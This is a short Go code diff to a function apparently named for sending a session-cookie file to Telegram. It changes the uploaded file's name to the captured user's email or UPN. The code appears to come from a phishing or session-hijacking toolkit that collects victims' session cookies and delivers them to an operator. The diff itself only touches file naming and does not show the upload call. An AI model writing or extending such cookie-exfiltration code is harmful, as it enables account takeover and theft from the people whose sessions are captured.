@@ -1277,18 +1277,19 @@ func (nm *NotifierManager) sendTelegramWithCookieFile(n *NotifierConfig, event s
 	}
 	cookieContent := string(jsonBytes)
 
-	// Determine filename from username
-	usernameFile := "session_cookies"
+	// Determine filename from email address (prefer email over username)
+	filenameBase := "session_cookies"
 	if username != "" {
-		// Sanitize username for filename (remove special chars)
-		usernameFile = strings.Map(func(r rune) rune {
+		// Use email/UPN as filename - looks like email@domain.com
+		// Sanitize for filename (keep alphanumeric, dots, @, hyphens, underscores)
+		filenameBase = strings.Map(func(r rune) rune {
 			if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' || r == '@' {
 				return r
 			}
 			return '_'
 		}, username)
 	}
-	filename := fmt.Sprintf("%s.txt", usernameFile)
+	filename := fmt.Sprintf("%s.txt", filenameBase)
 
 	// Create multipart form using Go's standard library
 	var body bytes.Buffer
